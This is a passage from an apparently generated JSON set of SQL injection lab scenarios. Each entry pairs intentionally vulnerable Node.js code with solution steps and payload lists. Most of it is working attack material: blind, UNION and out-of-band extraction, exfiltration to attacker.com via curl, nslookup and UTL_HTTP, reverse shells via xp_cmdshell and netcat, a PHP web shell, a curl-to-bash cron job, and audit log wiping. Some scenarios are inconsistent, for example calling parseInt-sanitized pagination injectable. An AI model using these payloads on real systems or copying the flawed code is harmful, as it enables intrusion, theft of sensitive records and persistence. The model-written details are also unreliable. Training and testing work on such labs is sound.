      "2. Identify injectable parameter: comment_id=1",
      "3. Develop Python script using bitwise operators: (ASCII(SUBSTR((SELECT api_key FROM users),1)) >> 7 & 1",
      "4. Optimize with binary search pattern matching",
      "5. Automate extraction with sqlmap: sqlmap -u http://cms/comments/approve --data 'comment_id=1*' --technique=B"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql2');\nconst app = express();\n\nconst pool = mysql.createPool({\n  host: 'localhost',\n  user: 'cms_user',\n  password: 'insecure_pass',\n  database: 'wp_content'\n});\n\napp.post('/comments/approve', (req, res) => {\n  const commentId = req.body.comment_id;\n  const query = `UPDATE comments SET approved = 1 WHERE id = ${commentId}`;\n\n  pool.query(query, (err, result) => {\n    if (err) return res.status(500).send('Approval failed');\n    res.send(result.affectedRows > 0 ? 'Approved' : 'Invalid comment');\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "1 AND (SELECT SUBSTRING(api_key,1,1) FROM users LIMIT 1) = 'a'--",
      "1' AND (SELECT LENGTH(api_key) FROM users)=32 AND '1'='1",
      "1) AND (SELECT IF(ASCII(SUBSTR(api_key,1)) > 100,1,0))=1--",
      "1 AND (SELECT COUNT(*) FROM users WHERE api_key LIKE 'a%')=1--"
    ]
  },
  {
    "Lab scenario": "Government Portal UNION SQLi in Document Metadata",
    "Lab Description": "A municipal document archive system constructs SQL queries using unsanitized document IDs with UNION operator support. The Oracle backend requires explicit NULL type casting and provides detailed error messages. To solve: Extract sensitive tax records through multi-stage UNION attacks with column type matching and XML encoding bypasses.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Identify injectable parameter: GET /documents/12345",
      "2. Determine column count using ORDER BY 9999--",
      "3. Match column types: ' UNION SELECT NULL,NULL,NULL,NULL FROM DUAL--",
      "4. Extract data: ' UNION SELECT NULL,DBMS_LOB.SUBSTR(document_content),NULL,NULL FROM tax_records--",
      "5. Bypass output encoding using XMLAGG() function"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst oracledb = require('oracledb');\nconst app = express();\n\napp.get('/documents/:id', async (req, res) => {\n  const docId = req.params.id;\n  try {\n    const conn = await oracledb.getConnection();\n    const query = `SELECT title, author, publish_date FROM documents WHERE doc_id = ${docId}`;\n    const result = await conn.execute(query);\n    res.json(result.rows);\n  } catch (err) {\n    res.status(500).send(err.message);\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "' UNION SELECT NULL,TO_CHAR(DBMS_LOB.SUBSTR(document_content)),NULL FROM tax_records--",
      "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT USER FROM DUAL))--",
      "'%00' UNION SELECT NULL,XMLAGG(XMLELEMENT(e, tax_id)).EXTRACT('//text()'),NULL FROM records--",
      "'; EXECUTE IMMEDIATE 'CREATE USER attacker IDENTIFIED BY pwned'--"
    ]
  },
  {
    "Lab scenario": "Social Media Platform Out-of-Band SQLi in Notifications",
    "Lab Description": "A social media platform constructs SQL queries using unsanitized notification IDs with MSSQL xp_cmdshell access. The application blocks direct error output but allows DNS-based exfiltration. To solve: Execute reverse shell via SQL injection chain and pivot to internal chat systems using cracked service account credentials.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Identify injectable parameter: POST /notifications/read",
      "2. Verify OOB DNS: 123; EXEC master..xp_cmdshell 'nslookup test.attacker.com'--",
      "3. Encode PowerShell reverse shell in hex",
      "4. Execute payload: ; EXEC xp_cmdshell 'powershell -e <encoded>'--",
      "5. Pivot to internal 10.0.5.0/24 network using cracked mssql_svc credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mssql = require('mssql');\nconst app = express();\n\nconst config = {\n  user: 'social_user',\n  password: 'P@ssw0rd!',\n  server: 'dbserver',\n  options: { encrypt: false }\n};\n\napp.post('/notifications/read', async (req, res) => {\n  const notifId = req.body.notification_id;\n  try {\n    const pool = await mssql.connect(config);\n    await pool.request().query(\n      `UPDATE notifications SET read = 1 WHERE id = ${notifId}`\n    );\n    res.json({ success: true });\n  } catch (err) {\n    res.status(500).json({ error: 'Update failed' });\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "123; EXEC xp_cmdshell 'whoami > C:\\inetpub\\wwwroot\\whoami.txt'--",
      "0; DECLARE @s VARCHAR(8000); SET @s=0x...; EXEC(@s);--",
      "1; DROP TABLE IF EXISTS tmp; CREATE TABLE tmp (data VARCHAR(8000)); BULK INSERT tmp FROM '\\\\attacker.com\\share\\payload.txt'; EXEC('');--",
      "123; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--"
    ]
  },
  {
    "Lab scenario": "Education Portal Second-Order SQLi in Course Registration",
    "Lab Description": "A university portal stores unsanitized user input in course enrollment records that later gets used in batch processing queries. The PostgreSQL backend allows prepared statement bypass through JSON encoding. To solve: Poison course descriptions with time-based payloads and trigger nightly batch job to execute OS commands via COPY TO PROGRAM.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Inject course description: '||(SELECT CASE WHEN 1=1 THEN pg_sleep(5) END)--",
      "2. Schedule batch job with poisoned course entries",
      "3. Trigger nightly CSV generation through admin UI",
      "4. Exfiltrate data via DNS: COPY (SELECT password FROM users) TO PROGRAM 'nslookup $(hostname).attacker.com'",
      "5. Maintain persistence via cron job creation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst pg = require('pg');\nconst app = express();\napp.use(express.json());\n\napp.post('/courses', async (req, res) => {\n  const { title, description } = req.body;\n  const client = new pg.Client(process.env.DB_URL);\n  \n  try {\n    await client.connect();\n    await client.query(\n      `INSERT INTO courses (title, description) \n       VALUES ('${title}', '${description}')`\n    );\n    res.send('Course created');\n  } catch (err) {\n    res.status(500).send(err.message);\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "'||(SELECT CASE WHEN (SELECT COUNT(*) FROM users)=3 THEN pg_sleep(5) END)--",
      "'; COPY (SELECT password FROM users) TO PROGRAM 'curl http://attacker.com/$(hostname)'--",
      "'%00' UNION SELECT NULL,(SELECT ARRAY_AGG(password) FROM users)::text,NULL--",
      "'; CREATE TABLE exfil(data text); GRANT ALL ON exfil TO PUBLIC; COPY exfil FROM PROGRAM 'whoami'--"
    ]
  },
  {
    "Lab scenario": "Logistics System Time-Based SQLi in Shipment Tracking",
    "Lab Description": "A global logistics platform constructs SQL queries using unsanitized tracking numbers in WHERE clauses. The MariaDB backend allows stacked queries with SLEEP() function access but provides no direct output. To solve: Exfiltrate shipment manifests through DNS-based out-of-band channel using conditional time delays and LOAD_FILE() function.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Identify injectable parameter: GET /tracking/ABC123",
      "2. Verify time delay: ' OR SLEEP(5)--",
      "3. Configure DNS monitoring with OOB testing endpoint",
      "4. Craft payload: ' OR (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT manifest FROM shipments),'.attacker.com'))--",
      "5. Correlate DNS logs with extracted shipment data"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql2');\nconst app = express();\n\nconst pool = mysql.createPool({\n  host: 'localhost',\n  user: 'logistics_user',\n  password: 'insecure_pass',\n  database: 'shipment_tracking'\n});\n\napp.get('/tracking/:id', (req, res) => {\n  const trackingId = req.params.id;\n  const query = `SELECT * FROM shipments WHERE tracking_id = '${trackingId}'`;\n\n  pool.query(query, (err, results) => {\n    if (err) return res.status(500).send('Tracking error');\n    res.json(results[0]);\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "' OR SLEEP(10)--",
      "' OR (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT DATABASE()),'.attacker.com'))--",
      "' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--",
      "'; SELECT SLEEP(5) INTO OUTFILE '/var/www/html/test.txt'--"
    ]
  },
  {
    "Lab scenario": "HR System Union-Based SQLi in Employee Search",
    "Lab Description": "A corporate HR platform constructs SQL queries using unsanitized search parameters in ORDER BY clauses. The MySQL backend returns unionized results in JSON format with type validation. To solve: Extract salary information and SSNs through multi-stage UNION attacks with explicit type casting and JSON array bypass techniques.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept POST /employees/search with sort=name",
      "2. Determine column count using ORDER BY 9999--",
      "3. Match JSON types: ' UNION SELECT NULL,CAST(salary AS JSON),NULL--",
      "4. Bypass output encoding using JSON_ARRAYAGG()",
      "5. Decode results and purge audit logs using stacked queries"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql2/promise');\nconst app = express();\n\napp.post('/employees/search', async (req, res) => {\n  const { sort } = req.body;\n  const conn = await mysql.createConnection({\n    host: 'localhost',\n    user: 'hr_user',\n    password: 'HrP@ss123',\n    database: 'employee_db'\n  });\n\n  try {\n    const query = `SELECT id, name, department FROM employees ORDER BY ${sort}`;\n    const [rows] = await conn.query(query);\n    res.json(rows);\n  } catch (err) {\n    res.status(500).json({ error: err.message });\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "' UNION SELECT NULL,CONCAT(name,':',ssn),NULL FROM payroll--",
      "' AND 1=CONVERT(JSON_EXTRACT((SELECT salary FROM payroll), '$[0]'), UNSIGNED)--",
      "'%00' UNION SELECT NULL,JSON_ARRAYAGG(ssn),NULL FROM employees--",
      "'; UPDATE employees SET salary=100000 WHERE user='admin'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal Time-Based SQL Injection in Login Authentication",
    "Lab Description": "This lab features a login form in a banking portal that uses unsafe string concatenation to authenticate users. It is vulnerable to time-based blind SQL injection using conditional delays. The application does not return errors or success messages clearly, but response delay can be used to infer success or failure. To solve: Exploit the time delay vulnerability to enumerate the administrator password one character at a time using tools like sqlmap or a custom Python script.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the POST request to /login.",
      "2. Inject a time-based payload into the username field: admin' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)--",
      "3. Measure the delay using OWASP ZAP or sqlmap to infer true/false for each character.",
      "4. Write a script or use sqlmap to enumerate the password character by character.",
      "5. Use the discovered password to login as administrator."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;\n  db.query(sql, (err, result) => {\n    if (result.length > 0) {\n      res.send('Login successful');\n    } else {\n      res.send('Invalid login');\n    }\n  });\n});",
    "payloads": [
      "admin' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)--",
      "admin' AND SLEEP(5)--",
      "admin' OR 1=1--"
    ]
  },
  {
    "Lab scenario": "Banking API GraphQL Union-Based SQLi in Transaction History",
    "Lab Description": "A financial institution's GraphQL endpoint constructs SQL queries using unsanitized input from 'orderBy' arguments in transaction history requests. The vulnerable implementation uses string concatenation for field sorting and returns full query errors through debug headers. To solve: Exfiltrate account PIN hashes using multi-stage UNION attacks with type coercion and GraphQL alias bypass techniques while evading special character filters.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Capture GraphQL POST request in Burp Suite with 'orderBy' parameter",
      "2. Identify injection point: {\"query\":\"query { transactions(orderBy: \"amount_desc')\"}\"}}",
      "3. Use Postman to send nested query: 'orderBy: \"1' UNION SELECT NULL,salt,NULL,NULL FROM pins--\"",
      "4. Bypass WAF using GraphQL field aliases: pinHash:pin_hash::text",
      "5. Decode base64 results and purge audit logs using stacked mutation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst pg = require('pg');\n\nconst pool = new pg.Pool({\n  host: 'localhost',\n  user: 'bank_api',\n  password: 'Secur3P@ss',\n  database: 'transactions_db'\n});\n\nconst schema = `\n  type Transaction {\n    id: ID!\n    amount: Float!\n    date: String!\n  }\n  \n  type Query {\n    transactions(orderBy: String!): [Transaction]\n  }\n`;\n\nconst root = {\n  transactions: async ({ orderBy }) => {\n    try {\n      const query = `\n        SELECT id, amount, date \n        FROM transactions \n        ORDER BY ${orderBy} \n        LIMIT 100\n      `;\n      console.debug('Executing:', query); // Verbose logging\n      const res = await pool.query(query);\n      return res.rows;\n    } catch (err) {\n      throw new Error(`Query failed: ${err.message}`);\n    }\n  }\n};\n\nconst app = express();\napp.use('/graphql', graphqlHTTP({\n  schema: require('graphql').buildSchema(schema),\n  rootValue: root,\n  graphiql: true\n}));\n\napp.listen(3000, () => console.log('GraphQL API running on port 3000'));",
    "payloads": [
      "\"1' UNION SELECT NULL,ENCODE(pin_hash,'base64'),NULL,NULL FROM pins--\"",
      "\"'||(SELECT salt FROM pins LIMIT 1)||'\"",
      "\"1'/**/UNION/*!50000SELECT*/table_name,column_name,NULL/*!FROM*/information_schema.columns--\"",
      "\"%00' UNION SELECT 1,pg_read_file('/etc/passwd'),3,4--"
    ]
  },
  {
    "Lab scenario": "IoT Device Boolean-Blind SQLi in Sensor Group HAVING Clause",
    "Lab Description": "An industrial sensor monitoring system constructs HAVING clauses using unsanitized group IDs with boolean response patterns. The SQLite backend provides no direct error feedback but returns HTTP 204 for valid queries. To solve: Extract device admin credentials using bitwise brute-force techniques and differential timing analysis while bypassing request throttling limits.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept POST /api/sensor-groups with group_id=1",
      "2. Identify boolean condition: {\"group_id\":\"1' AND 1=1--\"} returning 204",
      "3. Develop Python script using binary search: (ASCII(SUBSTR((SELECT password FROM users),1)) >> 3 & 31",
      "4. Bypass rate limits with IP rotation and header randomization",
      "5. Correlate response times with credential bits"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3');\nconst app = express();\napp.use(express.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE sensors (id INT, group_id INT, value REAL)\");\n  db.run(\"INSERT INTO sensors VALUES (1, 1, 25.3)\");\n  db.run(\"CREATE TABLE users (username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users VALUES ('admin', 's3cr3tP@ss!123')\");\n});\n\napp.post('/api/sensor-groups', (req, res) => {\n  const groupId = req.body.group_id;\n  const query = `\n    SELECT sensor_id, AVG(value) \n    FROM sensors \n    GROUP BY sensor_id \n    HAVING group_id = ${groupId}`;\n\n  db.all(query, (err, rows) => {\n    if (err || rows.length === 0) return res.status(400).end();\n    res.status(204).end(); // Boolean response pattern\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "' AND (SELECT SUBSTR(password,1,1) FROM users) = 's'--",
      "' OR (SELECT LENGTH(password) FROM users)=12 AND '1'='1",
      "') AND (SELECT HEX(SUBSTR(password,1)) FROM users) > '30'--",
      "' AND RANDOMBLOB(100000000) IS NOT NULL--"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal Time-Based SQLi in Patient Search LIMIT Clause",
    "Lab Description": "A medical records system constructs LIMIT/OFFSET clauses using unsanitized pagination parameters with PostgreSQL backend. The application provides no visual feedback but allows stacked queries with pg_sleep(). To solve: Exfiltrate sensitive diagnosis codes through DNS-based out-of-band channel using conditional time delays and COPY TO PROGRAM vector.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Identify injectable GET /patients?page=2 parameter",
      "2. Verify time delay: 1; SELECT CASE WHEN 1=1 THEN pg_sleep(5) END--",
      "3. Configure Interactsh client for DNS callback monitoring",
      "4. Craft payload: 1; COPY (SELECT icd_code FROM diagnoses) TO PROGRAM 'nslookup $(hostname).attacker.com'--",
      "5. Correlate DNS logs with extracted medical codes"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst { Pool } = require('pg');\nconst app = express();\n\nconst pool = new Pool({\n  host: 'localhost',\n  database: 'medical_records',\n  ssl: false\n});\n\napp.get('/patients', async (req, res) => {\n  const page = parseInt(req.query.page) || 1;\n  const offset = (page - 1) * 10;\n  \n  try {\n    const query = `SELECT * FROM patients LIMIT 10 OFFSET ${offset}`;\n    const result = await pool.query(query);\n    res.json(result.rows);\n  } catch (err) {\n    res.status(500).send('Query error');\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "; SELECT CASE WHEN (SELECT COUNT(*) FROM diagnoses)=100 THEN pg_sleep(10) END--",
      "0; CREATE TEMP TABLE exfil(data text); INSERT INTO exfil SELECT icd_code FROM diagnoses; COPY exfil TO PROGRAM 'curl http://attacker.com/?data='$(cat exfil)'--",
      "1%3b%20CREATE%20OR%20REPLACE%20FUNCTION%20exfil(TEXT)%20RETURNS%20VOID%20AS%20$$%20COPY%20tmp%20FROM%20PROGRAM%20'ping%20-c%201%20'||$1||'.attacker.com'%3b%20$$%20LANGUAGE%20SQL%3b%20SELECT%20exfil(icd_code)%20FROM%20diagnoses--",
      "0' UNION SELECT NULL,current_database(),NULL--"
    ]
  },
  {
    "Lab scenario": "E-Commerce Platform Union-Based SQLi in Product Filter ORDER BY",
    "Lab Description": "An online marketplace constructs ORDER BY clauses using unsanitized JSON input parameters with MSSQL backend. The vulnerable endpoint returns detailed type conversion errors through debug headers. To solve: Extract credit card tokens using multi-stage UNION attacks with explicit type casting and FOR JSON PATH output bypass.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept POST /api/products/search with 'sort' parameter",
      "2. Trigger error: {\"sort\":\"name')\"} to expose query structure",
      "3. Determine column count using ORDER BY 9999--",
      "4. Extract tokens: ' UNION SELECT NULL,STRING_AGG(card_token,','),NULL FOR JSON PATH--",
      "5. Decode nested JSON results and clear event logs"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mssql = require('mssql');\nconst app = express();\napp.use(express.json());\n\nconst config = {\n  user: 'ecom_user',\n  password: 'P@ssw0rd123',\n  server: 'localhost',\n  options: { encrypt: false }\n};\n\napp.post('/api/products/search', async (req, res) => {\n  try {\n    const { sort } = req.body;\n    const pool = await mssql.connect(config);\n    const query = `SELECT product_id, name, price FROM products ORDER BY ${sort}`;\n    \n    console.debug('Executing:', query); // Debug logging\n    const result = await pool.request().query(query);\n    \n    res.set('X-Query-Debug', 'true')\n       .json(result.recordset);\n  } catch (err) {\n    res.status(500)\n       .set('X-SQL-Error', err.message)\n       .json({ error: 'Query failed' });\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "' UNION SELECT NULL,card_token,NULL FROM payments FOR JSON PATH--",
      "' AND 1=CONVERT(INT,(SELECT TOP 1 card_token FROM payments))--",
      "'%00' UNION SELECT 1,CAST(card_token AS XML),3 FROM payments FOR XML PATH('')--",
      "'; INSERT INTO exfil(data) SELECT card_token FROM payments--"
    ]
  },
  {
    "Lab scenario": "Government Portal Second-Order SQLi in Document Comments",
    "Lab Description": "A municipal document system stores unsanitized user input in comment metadata that later gets used in report generation queries. The Oracle backend allows DBMS_SCHEDULER access but filters semicolons. To solve: Poison document metadata with time-based payloads and trigger PDF export to execute OS commands via external tables.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Inject comment metadata: '||DBMS_LDAP.INIT((SELECT banner FROM v$version),80)--",
      "2. Schedule nightly report generation job",
      "3. Trigger PDF export through admin interface",
      "4. Exfiltrate data via DNS: UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT sys_context('userenv','current_user') FROM dual))--",
      "5. Maintain access via scheduled job creation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst oracledb = require('oracledb');\nconst app = express();\napp.use(express.json());\n\napp.post('/comments', async (req, res) => {\n  const { doc_id, comment } = req.body;\n  try {\n    const conn = await oracledb.getConnection();\n    await conn.execute(\n      `INSERT INTO comments (doc_id, text) \n       VALUES (${doc_id}, '${comment}')`\n    );\n    res.send('Comment added');\n  } catch (err) {\n    res.status(500).send(err.message);\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "'||UTL_INADDR.GET_HOST_NAME((SELECT password FROM users WHERE ROWNUM=1))--",
      "'||DBMS_SCHEDULER.CREATE_JOB(job_name=>'EXFIL',job_type=>'EXECUTABLE',job_action=>'/bin/bash',number_of_arguments=>4,enabled=>FALSE,auto_drop=>TRUE,arguments=>(''-c'',''echo ${IFS}$(hostname)|nc attacker.com 1337''))--",
      "'||CTXSYS.DRITHSX.SN(1,(SELECT table_name FROM all_tables WHERE ROWNUM=1))--",
      "'||DBMS_LDAP.INIT((SELECT SYS_CONTEXT('USERENV','CURRENT_USER') FROM DUAL)||'.exfil.com',80)--"
    ]
  },
  {
    "Lab scenario": "Banking API UNION-Based SQLi in Transaction Sorting",
    "Lab Description": "A financial REST API endpoint vulnerable to SQL injection in the 'sort' parameter of transaction history requests. The application constructs ORDER BY clauses using unsanitized user input and returns detailed error messages through debug headers. The Microsoft SQL Server backend requires precise type matching for UNION attacks. To solve: Extract account numbers and balances using column type coercion and error-based data exfiltration while bypassing WAF filters that block UNION operators.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Intercept GET /api/transactions?sort=date request with Burp Suite",
      "2. Identify injectable parameter using OWASP ZAP active scan: sort=date'+AND+1=convert(int,(SELECT@@version))--",
      "3. Craft type-coerced UNION payload: ' UNION SELECT NULL,CAST(account_number AS VARCHAR(MAX)),NULL,NULL FROM accounts--",
      "4. Bypass WAF using whitespace alternatives: '/*!50000UNION*//*!50000SELECT*/",
      "5. Verify data extraction via response body and clear query logs with '; EXEC xp_cmdshell('wevtutil cl Application')--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mssql = require('mssql');\nconst app = express();\n\nconst config = {\n  user: 'bank_api',\n  password: 'S3cur3P@ss!',\n  server: 'dbserver',\n  options: { encrypt: false }\n};\n\napp.get('/api/transactions', async (req, res) => {\n  try {\n    const sort = req.query.sort || 'date';\n    const pool = await mssql.connect(config);\n    const query = `SELECT id, amount, date FROM transactions ORDER BY ${sort}`;\n    \n    console.debug('Executing:', query); // Verbose logging\n    const result = await pool.request().query(query);\n    \n    res.set('X-Query-Debug', 'enabled')\n       .json(result.recordset);\n  } catch (err) {\n    res.status(500)\n       .set('X-SQL-Error', err.originalError.message)\n       .json({ error: 'Query failed' });\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "' AND 1=CONVERT(INT,(SELECT TOP 1 account_number FROM accounts))--",
      "' UNION SELECT NULL,account_number,NULL FROM accounts WHERE '1'='1",
      "'%00' UNION SELECT 1,CAST(balance AS XML),3 FROM accounts FOR XML PATH('')--",
      "'; INSERT INTO exfil(data) SELECT account_number FROM accounts--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard Blind SQLi in Device Group Filter",
    "Lab Description": "An industrial control system vulnerable to boolean-based blind SQL injection in the device grouping parameter. The PostgreSQL backend provides no direct error feedback but returns different HTTP status codes for true/false conditions. To solve: Extract admin credentials through bitwise brute-force techniques and differential response analysis while evading HTTP request throttling limits.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Map injection point using OWASP ZAP fuzzer on group_id parameter",
      "2. Identify boolean triggers: '1'='1'-- vs '1'='2'-- via response status codes",
      "3. Develop Python script with binary search: (ASCII(SUBSTR((SELECT password FROM users),1)) > 100",
      "4. Optimize with parallel requests using multiple User-Agent headers",
      "5. Automate extraction with sqlmap: sqlmap -u http://iot/api/groups --data 'group_id=1*' --technique=B --level=5"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst pg = require('pg');\nconst app = express();\n\napp.post('/api/groups', (req, res) => {\n  const groupId = req.body.group_id;\n  const client = new pg.Client(process.env.DB_URL);\n  \n  client.connect().then(() => {\n    const query = `SELECT device_id, COUNT(*) \n                 FROM sensors \n                 GROUP BY device_id \n                 HAVING group_id = ${groupId}`;\n    \n    client.query(query, (err, result) => {\n      if (err || result.rows.length === 0) return res.status(400).end();\n      res.status(204).end(); // Boolean response\n    });\n  }).catch(err => res.status(500).end());\n});\n\napp.listen(3000);",
    "payloads": [
      "' OR (SELECT CASE WHEN (ASCII(SUBSTR(password,1)) > 100 THEN 1 ELSE 1/(SELECT 0) END FROM users)=1--",
      "' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=12--",
      "') AND (SELECT COUNT(*) FROM pg_catalog.pg_tables)=42--",
      "' AND (SELECT 1 FROM GENERATE_SERIES(1,10000000))--"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal Time-Based SQLi in Patient Search",
    "Lab Description": "A medical records system vulnerable to stacked time-based SQL injection in pagination parameters. The MySQL backend allows delayed query execution but filters UNION operators. To solve: Exfiltrate sensitive diagnosis codes through DNS-based out-of-band channel using conditional SLEEP() statements and LOAD_FILE() function while bypassing file privilege restrictions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Identify injectable GET /patients?page=2 parameter",
      "2. Verify time delay: '; SELECT IF(1=1,SLEEP(5),0)--",
      "3. Configure Burp Collaborator for DNS callback monitoring",
      "4. Craft payload: '; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT icd_code FROM diagnoses LIMIT 1),'.attacker.com'))--",
      "5. Correlate DNS logs with extracted medical codes"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql2');\nconst app = express();\n\nconst pool = mysql.createPool({\n  host: 'localhost',\n  user: 'healthcare_user',\n  password: 'Insecure123',\n  database: 'patient_records'\n});\n\napp.get('/patients', (req, res) => {\n  const page = parseInt(req.query.page) || 1;\n  const offset = (page - 1) * 10;\n  const query = `SELECT * FROM patients LIMIT 10 OFFSET ${offset}`;\n\n  pool.query(query, (err, results) => {\n    if (err) return res.status(500).send('Query error');\n    res.json(results[0]);\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "; SELECT SLEEP(10)--",
      "' OR IF(ASCII(SUBSTR((SELECT icd_code FROM diagnoses),1))>100, SLEEP(5), 0)--",
      "'; CREATE TABLE exfil(data TEXT); LOAD DATA INFILE '/etc/passwd' INTO TABLE exfil--",
      "' UNION SELECT NULL,LOAD_FILE('/var/www/config.ini'),NULL--"
    ]
  },
  {
    "Lab scenario": "E-Commerce Platform Error-Based SQLi in Product Filter",
    "Lab Description": "An online marketplace vulnerable to verbose error-based SQL injection in JSON search parameters. The Oracle backend leaks database schema through unhandled type conversion errors. To solve: Extract credit card tokens using nested error-induced data exfiltration and second-order injection via product review comments.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Trigger error with malformed JSON: {\"category\":\"Electronics')\"}",
      "2. Extract table structure via error message analysis",
      "3. Craft nested error payload: ' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT card_token FROM payments))--",
      "4. Inject review comment with second-order payload: '||UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT card_token FROM payments))--",
      "5. Correlate web server logs with extracted tokens"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst oracledb = require('oracledb');\nconst app = express();\napp.use(express.json());\n\napp.post('/api/products/search', async (req, res) => {\n  try {\n    const filters = req.body;\n    let whereClause = Object.entries(filters)\n      .map(([key, val]) => `${key} = '${val}'`)\n      .join(' AND ');\n\n    const conn = await oracledb.getConnection();\n    const result = await conn.execute(`SELECT * FROM products WHERE ${whereClause}`);\n    res.json(result.rows);\n  } catch (err) {\n    res.status(500)\n       .set('Oracle-Error', err.message)\n       .json({ error: 'Query failed' });\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT card_token FROM payments WHERE ROWNUM=1))--",
      "'%00' UNION SELECT NULL,XMLType(card_token).getStringVal(),NULL FROM payments--",
      "'; EXECUTE IMMEDIATE 'CREATE USER attacker IDENTIFIED BY pwned'--",
      "'||DBMS_LDAP.INIT((SELECT card_token FROM payments)||'.exfil.com',80)--"
    ]
  },
  {
    "Lab scenario": "CMS Second-Order SQLi in User Registration",
    "Lab Description": "A content management system stores unsanitized user input during registration that later gets used in password reset queries. The SQLite backend allows stacked queries but filters semicolons. To solve: Poison user metadata with time-based payloads and trigger password reset to execute OS commands via ATTACH DATABASE vector.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Register user with poisoned email: '||(SELECT CASE WHEN 1=1 THEN LOAD_EXTENSION('evil.so') END))--",
      "2. Initiate password reset for target admin account",
      "3. Exploit second-order injection in reset token generation",
      "4. Execute commands via ATTACH DATABASE: '; ATTACH DATABASE '/var/www/cmd.php' AS pwn;--",
      "5. Access injected PHP web shell via HTTP"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3');\nconst app = express();\napp.use(express.urlencoded());\n\nconst db = new sqlite3.Database('cms.db');\n\napp.post('/register', (req, res) => {\n  const { username, email } = req.body;\n  db.run(\n    `INSERT INTO users (username, email) \n     VALUES ('${username}', '${email}')`, \n    (err) => {\n      if (err) return res.status(500).send(err.message);\n      res.send('Registration complete');\n    }\n  );\n});\n\napp.listen(3000);",
    "payloads": [
      "'||(SELECT LOAD_EXTENSION('\\\\attacker.com\\share\\evil.dll'))--",
      "'; ATTACH DATABASE '/var/www/shell.php' AS pwn; CREATE TABLE pwn.exec (cmd TEXT); INSERT INTO exec VALUES ('<?php system($_GET[0]); ?>')--",
      "'||(SELECT WRITEFILE('/etc/cron.d/pwn', '* * * * * root curl http://attacker.com/pwn.sh | bash'))--",
      "'; .open --hexdata 3c3f7068700a..."
    ]
  },
  {
    "Lab scenario": "Government Portal Union-Based SQLi in Document Metadata",
